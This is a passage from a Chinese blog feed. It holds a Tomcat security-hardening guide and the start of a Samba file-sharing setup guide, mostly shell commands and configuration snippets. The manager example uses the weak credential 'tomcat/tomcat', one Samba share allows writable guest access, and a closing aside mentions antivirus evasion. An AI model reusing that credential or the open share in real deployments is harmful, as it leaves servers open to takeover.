class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Server   一个Server即对应一个Tomcat实例,实际中机器性能好的情况下,建议直接分成多实例,不建议用它自带的虚拟主机,虚拟主机之间对性能影响较大</span><br><span class="line">Service    通常由一个Engine以及一个或多个Connector组成</span><br><span class="line">Connector  主要就是用来监听指定端口,然后把指定端口的请求都交给Engine</span><br><span class="line">Engine   其实就是实际的处理引擎,下面可以同时配置多个虚拟主机,它自身会根据域名来匹配到对应的虚拟主机</span><br><span class="line">Host   即虚拟主机,一个Host即一个虚拟主机</span><br><span class="line">Context   Context在创建的时候会根据配置文件$CATALINA_HOME/conf/web.xml</span><br><span class="line">   和$WEBAPP_HOME/WEB-INF/web.xml载入Servlet类,当Context收到请求时</span><br><span class="line">   将到自己的映射表 [mapping table]中寻找相匹配的Servlet类,如果找到,则执行该类,并回应该请求</span><br></pre></td></tr></table></figure></p><p>tomcat 主配置文件结构大致如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;Server&gt;</span><br><span class="line">  &lt;Service&gt;</span><br><span class="line">    &lt;Connector/&gt;</span><br><span class="line">    &lt;Engine&gt;</span><br><span class="line">      &lt;Host&gt;</span><br><span class="line">        &lt;Context&gt;&lt;/Context&gt;</span><br><span class="line">      &lt;/Host&gt;</span><br><span class="line">     &lt;/Engine&gt;</span><br><span class="line">  &lt;/Service&gt;</span><br><span class="line">  &lt;Service&gt;</span><br><span class="line">   ...</span><br><span class="line">  &lt;/Service&gt;</span><br><span class="line">&lt;/Server&gt;</span><br></pre></td></tr></table></figure></p><p>0x06 一个标准的 <code>Java web</code> 目录结构,如下</p><p><img src="/img/java web.jpg" alt=""></p><p>0x07 如何快速纯手工在Tomcat中自定义一个基于域名的虚拟主机,还是那句话,实际中机器性能够的情况下,建议用tomcat多实例,不建议用虚拟主机</p><p>先准备好站点所需的各种目录,务必要严格按照上面的java web标准来<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"># mkdir /data/&#123;javaweb,logs&#125; -p</span><br><span class="line"># chown -R tomcat:tomcat /data/</span><br><span class="line">$ su - tomcat</span><br><span class="line">$ cd /data/javaweb/</span><br><span class="line">$ mkdir secapp/&#123;lib,classes,WEB-INF,META-INF&#125; -p</span><br><span class="line">$ vi secapp/index.jsp</span><br><span class="line">  &lt;html&gt;</span><br><span class="line">  &lt;body&gt;</span><br><span class="line">  &lt;br&gt;</span><br><span class="line">  &lt;center&gt;&lt;h1&gt;This is a Tomcat Server 8.x &lt;/h1&gt; </span><br><span class="line">  &lt;br&gt;&lt;h2&gt;Now time is: &lt;%=new java.util.Date()%&gt;&lt;/h2&gt;&lt;/center&gt;</span><br><span class="line">  &lt;/body&gt;</span><br><span class="line">  &lt;/html&gt;</span><br></pre></td></tr></table></figure></p><p>再到tomcat主配置文件中添加Host标签段,记得禁用自动部署和自动解war包<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">$ vi /usr/local/tomcat/conf/server.xml</span><br><span class="line">  &lt;Host name=&quot;www.sec.org&quot; appBase=&quot;/data/javaweb/secapp&quot; autoDeploy=&quot;false&quot; unpackWARs=&quot;true&quot;&gt;</span><br><span class="line">    &lt;Context path=&quot;&quot; docBase=&quot;.&quot; debug=&quot;0&quot; /&gt;</span><br><span class="line">    &lt;Valve className=&quot;org.apache.catalina.valves.AccessLogValve&quot; directory=&quot;/data/logs&quot;</span><br><span class="line">        prefix=&quot;www.sec.org_access_log&quot; suffix=&quot;.txt&quot;</span><br><span class="line">        pattern=&quot;%h %l %u %t &amp;quot;%r&amp;quot; %s %b&quot; /&gt;</span><br><span class="line">  &lt;/Host&gt;</span><br><span class="line"></span><br><span class="line">$ /usr/local/tomcat/bin/catalina.sh stop</span><br><span class="line">$ cd /usr/local/tomcat/  重启前最好把下面两个目录中的内容清空,防止缓存作祟</span><br><span class="line">$ rm -fr ./temp/*</span><br><span class="line">$ rm -fr ./work/*</span><br><span class="line">$ /usr/local/tomcat/bin/catalina.sh start </span><br><span class="line">$ cat /usr/local/tomcat/logs/catalina.out查看tomcat启动日志,一般来这儿都是为了看报错</span><br><span class="line">$ tail -f /data/logs/www.sec.org_access_log.2017-12-17.txt</span><br><span class="line">$ tree /usr/local/tomcat/work/</span><br></pre></td></tr></table></figure></p><p><img src="/img/virtual host tomcat.png" alt=""></p><p>0x08 配置Tomcat的web端管理功能,此功能比较危险,容易被人跑到管理账号密码,直接进来即可部署webshell,如非必须,建议删除<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ vi /usr/local/tomcat/conf/tomcat-users.xml</span><br><span class="line">  &lt;role rolename=&quot;manager-gui&quot;/&gt;</span><br><span class="line">  &lt;role rolename=&quot;admin-gui&quot;/&gt;</span><br><span class="line">  &lt;user username=&quot;tomcat&quot; password=&quot;tomcat&quot; roles=&quot;manager-gui,admin-gui&quot;/&gt; 让tomcat同时应用于两个角色</span><br><span class="line"></span><br><span class="line">$ /usr/local/tomcat/bin/catalina.sh start    修改完配置后重启tomcat</span><br><span class="line">$ /usr/local/tomcat/bin/catalina.sh stop</span><br></pre></td></tr></table></figure></p><p>0x09 修改管理端口及用于关闭服务的字符串,默认为<code>8005,SHUTDOWN</code>,实际中,一般也不会用这种方式来关闭tomcat,所以,可以把关闭字符串设的更长更随机一些,不过,好在最新版本tomcat默认只监听在127.0.0.1,所以对此项不必太过紧张<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ vi /usr/local/tomcat/conf/server.xml</span><br><span class="line">  &lt;Server port=&quot;9301&quot; shutdown=&quot;a8HelEd45fm43LseDF&quot;&gt;</span><br></pre></td></tr></table></figure></p><p>0x10 修改AJP协议通信端口,其实你可以直接把该项注释掉,因为绝大多数情况下我们都只会使用http协议进行反向代理,而不会用AJP协议<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ vi /usr/local/tomcat/conf/server.xml</span><br><span class="line">  &lt;!-- &lt;Connector port=&quot;8010&quot; protocol=&quot;AJP/1.3&quot; redirectPort=&quot;8443&quot; /&gt;--&gt;</span><br></pre></td></tr></table></figure></p><p>0x11 禁止tomcat目录遍历,将<code>param-value</code>标签中的值改为false,其实默认就是禁止的,只不过为了保险,还是需要再确认一下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$ vi /usr/local/tomcat/conf/web.xml</span><br><span class="line">  &lt;init-param&gt;</span><br><span class="line">    &lt;param-name&gt;listings&lt;/param-name&gt;</span><br><span class="line">    &lt;param-value&gt;false&lt;/param-value&gt;   &lt;!-- false即表示禁止目录遍历 --&gt; </span><br><span class="line">  &lt;/init-param&gt;</span><br><span class="line">  </span><br><span class="line">  &lt;welcome-file-list&gt; &lt;!-- 设置主页索引文件 --&gt;</span><br><span class="line">    &lt;welcome-file&gt;index.html&lt;/welcome-file&gt;</span><br><span class="line">    &lt;welcome-file&gt;index.htm&lt;/welcome-file&gt;</span><br><span class="line">    &lt;welcome-file&gt;index.jsp&lt;/welcome-file&gt;</span><br><span class="line">    &lt;welcome-file&gt;demo.jsp&lt;/welcome-file&gt;</span><br><span class="line">  &lt;/welcome-file-list&gt;</span><br></pre></td></tr></table></figure></p><p><img src="/img/dir list.png" alt=""></p><p>0x12 隐藏服务器版本信息,为了能一定程度上防止被人用0day批量打,我们需要将tomcat的详细版本稍微隐藏下,比如,在出现403,404,500这样的状态码时,就很容易会暴露我们web服务器的详细版本,当然,你也可以直接把指定的状态码重定向到指定的页面上<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$ cd /usr/local/tomcat/lib/</span><br><span class="line">$ unzip catalina.jar</span><br><span class="line">$ cd org/apache/catalina/util/</span><br><span class="line">$ vi ServerInfo.properties</span><br><span class="line">  server.info=Microsoft-IIS/7.5</span><br><span class="line">  server.number=7.5</span><br><span class="line">  server.built=Nov 27 2017 13:05:30 UTC</span><br><span class="line">$ cd /usr/local/tomcat/lib/</span><br><span class="line">$ jar uvf catalina.jar org/apache/catalina/util/ServerInfo.properties</span><br><span class="line">$ /usr/local/tomcat/bin/catalina.sh stop</span><br><span class="line">$ /usr/local/tomcat/bin/catalina.sh start</span><br></pre></td></tr></table></figure></p><p><img src="/img/tomcat version.png" alt=""></p><p>0x13 修改http响应头中的server字段名称,只需要在http连接器中添加指定的server属性即可<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ vi /usr/local/tomcat/conf/server.xml</span><br><span class="line">  &lt;Connector port=&quot;8080&quot; protocol=&quot;HTTP/1.1&quot;</span><br><span class="line">    connectionTimeout=&quot;20000&quot;</span><br><span class="line">    redirectPort=&quot;8443&quot; server=&quot;Microsoft-IIS/7.5&quot; /&gt;</span><br></pre></td></tr></table></figure></p><p><img src="/img/version tomcat display.png" alt=""></p><p>0x14 最好把所有Host组件中的自动部署选项全部关掉<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ vi /usr/local/tomcat/conf/server.xml</span><br><span class="line">  &lt;Host name=&quot;www.sec.org&quot; appBase=&quot;/data/javaweb/secapp&quot; autoDeploy=&quot;false&quot; unpackWARs=&quot;true&quot;&gt;</span><br></pre></td></tr></table></figure></p><p>0x15 如果我们是在前面使用apache或者nginx做的反向代理,也可通过限制特定ip的方式来访问,如下,表示仅允许<code>192.168.3.0/24</code>这个内网段来访问<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ vi /usr/local/tomcat/conf/server.xml</span><br><span class="line">  &lt;Host&gt;</span><br><span class="line">    ...</span><br><span class="line">    &lt;Context path=&quot;&quot; docBase=&quot;.&quot; debug=&quot;0&quot; /&gt;</span><br><span class="line">      &lt;Valve className=&quot;org.apache.catalina.valves.RemoteAddrValve&quot; allow=&quot;192.168.4.*&quot; deny=&quot;*.*.*.*&quot; /&gt;</span><br><span class="line">    ...  </span><br><span class="line">  &lt;/Host&gt;</span><br></pre></td></tr></table></figure></p><p><img src="/img/host allow.png" alt=""></p><p>0x16 限制其他用户对tomcat各类服务管理工具的使用<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ chmod -R 744 /usr/local/tomcat/bin/*</span><br></pre></td></tr></table></figure></p><p>0x17 配置更加详细的访问日志格式,方便后续做入侵审查,如添加记录 user-agent,referer 字段数据<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ vi /usr/local/tomcat/conf/server.xml</span><br><span class="line">  &lt;Valve className=&quot;org.apache.catalina.valves.AccessLogValve&quot; directory=&quot;/data/logs&quot;</span><br><span class="line">    prefix=&quot;www.sec.org_access_log&quot; suffix=&quot;.txt&quot;</span><br><span class="line">    pattern=&quot;%h %l %u %t &amp;quot;%r&amp;quot; %s %b %&#123;Referer&#125;i %&#123;User-Agent&#125;i %D&quot; resolveHosts=&quot;false&quot; /&gt;</span><br></pre></td></tr></table></figure></p><p><img src="/img/new log format.png" alt=""></p><p>0x18 关于Tomcat 7.x 版本,你可能还需要手工去禁用一些危险请求方法,将<code>readonly</code>的值设为<code>true</code>,即禁止<code>DELETE</code>及<code>PUT</code>方法,如下,不过在新版中,默认就处于禁用状态,无需关心<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ vi /usr/local/tomcat/conf/web.xml</span><br><span class="line">  &lt;init-param&gt;</span><br><span class="line">    &lt;param-name&gt;readonly&lt;/param-name&gt; </span><br><span class="line">    &lt;param-value&gt;true&lt;/param-value&gt; </span><br><span class="line">  &lt;/init-param&gt;</span><br></pre></td></tr></table></figure></p><p>0x19 必要情况下,可直接禁用tomcat提供的默认web管理端,防止入侵者用此方式部署webshell,此处采用的禁用方式只是把原来web管理端的文件都重新放到别的目录中,而后再到主配置文件中去注释掉默认的locahost所对应的host组件,最后重启tomcat即可,话说回来,status可以留着,因为可能后续还要靠此来监控jvm的一些性能参数,大家还是酌情而定吧<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">$ cd /usr/local/tomcat/webapps/</span><br><span class="line">$ mkdir tmp</span><br><span class="line">$ mv docs/ examples/ host-manager/ manager/ ROOT/ ./tmp/</span><br><span class="line"></span><br><span class="line">&lt;!-- </span><br><span class="line">&lt;Host name=&quot;localhost&quot;  appBase=&quot;webapps&quot;</span><br><span class="line">   unpackWARs=&quot;true&quot; autoDeploy=&quot;true&quot;&gt;</span><br><span class="line">--&gt;</span><br><span class="line">&lt;!--</span><br><span class="line">&lt;Valve className=&quot;org.apache.catalina.valves.AccessLogValve&quot; directory=&quot;logs&quot;</span><br><span class="line">   prefix=&quot;localhost_access_log&quot; suffix=&quot;.txt&quot;</span><br><span class="line">   pattern=&quot;%h %l %u %t &amp;quot;%r&amp;quot; %s %b&quot; /&gt;</span><br><span class="line">&lt;/Host&gt;</span><br><span class="line">--&gt;</span><br></pre></td></tr></table></figure></p><p>0x20 最后,时常去关注tomcat官方发布的一些高危漏洞补丁,tomcat 8.x 已经相对比较稳定了,所以也建议大家,务必在稳定的前提下使用更新一点的版本</p><p><br><br>后话:<br>&nbsp;&nbsp;&nbsp;&nbsp;因为关注的点不同,所以肯定有所偏颇,此处还是旨在防入侵,至于<code>针对jvm的各种性能优化</code>,后续有机会我们再单独说明,因为tomcat几乎都不会直接面向用户,大多都是通过反向代理的方式来提供服务的,另外,java自身的安全性和性能<code>采用编译的方式来运行</code>都要优于php,所以,针对tomcat的安全并没有像nginx或者apache压力那么大,而且由于tomcat是在后端,也相对比较好控制,虽然它到现在对java的一些类库支持的还不是很完整,但那些对我们而言暂时无需关心,以上部署仅供参考,并不完整,后续还会不断更新,大家可根据自己的实际业务需求再做进更进一步调整,关于java对渗透的功用,比如,免杀…想必大家也都非常熟悉了,这里就不多说了,更多其它内容,也非常欢迎大家来一起私信交流 ^_^</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;0x01 关于Tomcat,更多详情大家可直接参考百科说明&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;https://zh.wikipedia.org/wiki/Apache_Tomcat&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;此次演示环境&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;CentOS7 x86_64 	ip: 192.168.3.64&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Apache Tomcat/8.5.24 	建议大家使用较新版的稳定版本&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;0x02 首先,在正式部署Tomcat之前,需要先来准备好jdk环境,因为毕竟底层还是在靠java来处理,所以必须要先得有java的运行环境才行,其实,在实际生产环境中,也可以单独使用&lt;code&gt;jre&lt;/code&gt;,不过个人觉得这和安全的关系并不大,试想,如果你手里都已经拿到了一个可以运行java的环境了,我在本地用对应版本的jdk编译好了再丢上运行也是一样,防不住啥,太泛泛&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;# tar xf jdk-8u151-linux-x64.tar.gz&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# mv jdk1.8.0_151/ /usr/local/&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# ln -s /usr/local/jdk1.8.0_151/ /usr/local/jdk&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# tar xf apache-tomcat-8.5.24.tar.gz&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# mv apache-tomcat-8.5.24 /usr/local/&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# ln -s /usr/local/apache-tomcat-8.5.24/ /usr/local/tomcat&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# ll /usr/local/&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# vi /etc/profile&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  export JAVA_HOME=/usr/local/jdk/ &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  export PATH=$JAVA_HOME/bin:$JAVA_HOME/jre/bin:$PATH &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  export CLASSPATH=.$CLASSPATH:$JAVA_HOME/lib:$JAVA_HOME/jre/lib:$JAVA_HOME/lib/tools.jar&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  export TOMCAT_HOME=/usr/local/tomcat&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# source /etc/profile&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# java -version&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# javac&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="Tomcat 安全部署实战指南" scheme="https://evil-404.github.io/categories/Tomcat-%E5%AE%89%E5%85%A8%E9%83%A8%E7%BD%B2%E5%AE%9E%E6%88%98%E6%8C%87%E5%8D%97/"/>
    
    
      <category term="Tomcat 安全部署实战指南" scheme="https://evil-404.github.io/tags/Tomcat-%E5%AE%89%E5%85%A8%E9%83%A8%E7%BD%B2%E5%AE%9E%E6%88%98%E6%8C%87%E5%8D%97/"/>
    
  </entry>
  
  <entry>
    <title>跨平台快速文件共享 Samba</title>
    <link href="https://evil-404.github.io/2017-12-13-samba-sec.html"/>
    <id>https://evil-404.github.io/2017-12-13-samba-sec.html</id>
    <published>2017-12-12T20:09:17.000Z</published>
    <updated>2017-12-30T12:39:56.000Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>0x01 关于smaba<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">主要用于实现不同系统平台间的文件共享,配置非常简单,轻量,适合用于常规办公内网环境中</span><br><span class="line">linux &lt;==&gt; windows &lt;==&gt; unix</span><br></pre></td></tr></table></figure></p><p>此次演示环境<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">CentOS6.9 x86_64ip:192.168.3.55 samba服务器</span><br><span class="line">CentOS6.9 x86_64ip:192.168.3.57 用来模拟smb客户端进行访问测试</span><br></pre></td></tr></table></figure></p><p>0x02 samba服务默认所监听的端口<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">137/udp,138/udp nmb 进程提供netbios解析,以满足基于 CIFS 协议的共享访问环境</span><br><span class="line">138/tcp,445/tcp smb 进程主要为客户端提供文件共享,打印机服务以及用户权限验证</span><br></pre></td></tr></table></figure></p><p>0x03 使用samba客户端工具 <code>smbclient</code>,其实有些类似于ftp的客户端工具,也是一种交互式的访问</p><p><code>在linux下使用smbclient访问windows中的共享目录</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># smbclient -L 192.168.3.23 -U administrator</span><br><span class="line"># smbclient //192.168.3.23/linux_dir -U dcadmin</span><br><span class="line"># mount -t cifs //192.168.3.23/linux_dir /mnt/windows/ -o username=dcadmin 注意,此处要使用cifs协议进行挂载</span><br></pre></td></tr></table></figure></p><a id="more"></a><p><code>在linux下使用smbclient访问linux中samba服务共享目录</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># smbclient -L 192.168.3.55 -U webadmin</span><br></pre></td></tr></table></figure></p><p>0x04 安装samba服务所需的各种软件包<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># yum install samba samba-client samba-common -y</span><br><span class="line"># /etc/init.d/nmb start;/etc/init.d/smb start</span><br></pre></td></tr></table></figure></p><p>0x05 先来手工配置samba,编辑samba主配置文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"># cp /etc/samba/smb.conf /etc/samba/smb.conf.bak</span><br><span class="line"># egrep -v &quot;^$|;|#&quot; /etc/samba/smb.conf</span><br><span class="line"># vi /etc/samba/smb.conf</span><br><span class="line"></span><br><span class="line">[global]</span><br><span class="line">   workgroup = klionsec</span><br><span class="line">   server string = Samba Server Version %v</span><br><span class="line">   netbios name = SmbServer# netbios名称,有点儿类似windows的机器名</span><br><span class="line">   interfaces = eth0# 将端口监听在指定的网卡接口上</span><br><span class="line">   hosts allow = 192.168.3.# 只允许指定的网段访问</span><br><span class="line"></span><br><span class="line">   # samba日志文件存放位置</span><br><span class="line">   log file = /var/log/samba/log.%m</span><br><span class="line">   max log size = 50</span><br><span class="line"></span><br><span class="line">   # 启用为用户登陆模式</span><br><span class="line">   security = user</span><br><span class="line">   passdb backend = tdbsam</span><br><span class="line"></span><br><span class="line">[tools] # 访问时的共享目录名</span><br><span class="line">   comment = My HackTools  # 对该共享目录的用途描述</span><br><span class="line">   path = /data/tools  # 共享目录所在的绝对路径</span><br><span class="line">   guest ok = yes  # 是否允许以来宾用户身份访问</span><br><span class="line">   read only = no    # 表示对该共享目录可写</span><br><span class="line">   write list = webadmin,dbadmin  # 允许写的用户列表</span><br><span class="line">   browseable = yes  # 是否显示文件或目录列表</span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># testparm   用于测试samba主配置文件是否有语法错误,并显示最终生效的配置</span><br><span class="line"># /etc/init.d/smb restart;/etc/init.d/nmb restart</span><br><span class="line"># chkconfig smb on &amp;&amp; chkconfig nmb on</span><br></pre></td></tr></table></figure><p>0x06 创建用于共享访问的目录,并为该共享目录配置好权限,注意,如果要用户能写,务必要保证两点,首先,<code>smb.conf</code>中的共享目录要设置为<code>read only = no</code>,其次,还要对本地文件系统也能写才行,这里纯粹是为了方便才直接用facl来授权,你可以通过修改属主,属组来实现,比较简单,就不赘述了<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># mkdir /data/tools -p</span><br><span class="line"># setfacl -m u:sec:rx /data/tools/</span><br><span class="line"># setfacl -m g:admins:rwx /data/tools/直接对指定组setfacl</span><br><span class="line"># getfacl -c /data/tools/</span><br></pre></td></tr></table></figure></p><p>0x07 创建samba用户并为每个用户设置samba密码,注意samba的验证方式,samba用户虽为系统本地用户,但samba用户的密码却为samba服务自己的密码,并存在它自己特定格式的数据库中,再次强调,严禁弱口令<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># groupadd admins</span><br><span class="line"># useradd -G admins -s /sbin/nologin -M webadmin</span><br><span class="line"># useradd -G admins -s /sbin/nologin -M dbadmin</span><br><span class="line"># useradd -s /sbin/nologin -M sec</span><br><span class="line"># smbpasswd -a webadmin</span><br><span class="line"># smbpasswd -a dbadmin</span><br><span class="line"># smbpasswd -a sec</span><br></pre></td></tr></table></figure></p><p>0x08 关于smbpasswd的基本使用,主要用来将系统用户添加为samba内置用户<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">-d 禁用指定系统用户</span><br><span class="line">-e 启用指定系统用户</span><br><span class="line">-x 删除指定系统用户</span><br><span class="line">-a 